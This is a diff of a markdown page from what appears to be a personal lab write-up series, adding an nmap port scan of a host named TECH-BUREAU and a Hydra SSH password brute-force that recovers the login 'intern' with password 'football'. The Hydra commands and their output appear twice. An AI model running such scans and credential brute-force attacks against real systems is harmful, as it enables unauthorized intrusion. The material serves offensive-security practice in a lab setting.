@@ -2,7 +2,7 @@
 layout: default
 ---
 
-# TECH-BUREAU Series
+# TECH-BUREAU SERIES
 
 ## Phase 01: RECON/BRUTEFORCE/EXFILTRATION
 
@@ -13,15 +13,48 @@ layout: default
 
 ... 
 
-##Machine Recognisence Using nmap
-<pre data-label="Network Environment"><code>
-* <span class="red"><strong>AT4CK-3XPR3S$:</strong></span>  nmap -nP -p 22, 443 TECH-BUREAU
-* <span class="orange"><strong>open:</strong></span>  SSH
-* <span class="orange"><strong>Active Directory (AD) domain controller:</strong></span>  10.1.17[.]2 - WIN-GSH54QLW48D
-* <span class="orange"><strong>AD environment name:</strong></span>  BLUEMOONTUESDAY
-* <span class="orange"><strong>LAN segment gateway:</strong></span>  10.1.17[.]1
-* <span class="orange"><strong>LAN segment broadcast address:</strong></span>  10.1.17[.]255
+## Server Recognisence Using nmap
+<pre data-label="nmap scan"><code>
+<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ nmap -p 22,80,443,3306 TECH-BUREAU
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-21 16:11 CET
+Nmap scan report for TECH-BUREAU (192.168.1.10)
+Host is up (0.00061s latency).
+
+PORT     STATE  SERVICE
+22/tcp   <span class="orange"><strong>open</strong></span>   ssh
+80/tcp   <span class="red"><strong>closed</strong></span> http
+443/tcp  <span class="red"><strong>closed</strong></span> https
+3306/tcp <span class="orange"><strong>open</strong></span>   mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 </code></pre>
+---
+
+## SSH credential Hydra Attack
+<pre data-label="hydra bruteforce"><code>
+<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+Hydra starting at 2026-02-21 16:12:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking ssh://TECH-BUREAU:22/
+
+[22][ssh] host: <span class="orange">TECH-BUREAU</strong></span>   login: <span class="orange">intern</strong></span>   password: <span class="orange">football</strong></span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at 2026-02-21 16:12:21
+</code></pre>
+
+
+square@AT4K-3XPR3S:~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-21 16:12:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking ssh://TECH-BUREAU:22/
+[22][ssh] host: TECH-BUREAU   login: intern   password: football
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-21 16:12:21
 
 PHASE.01 – Noisy 
 The initial Setup
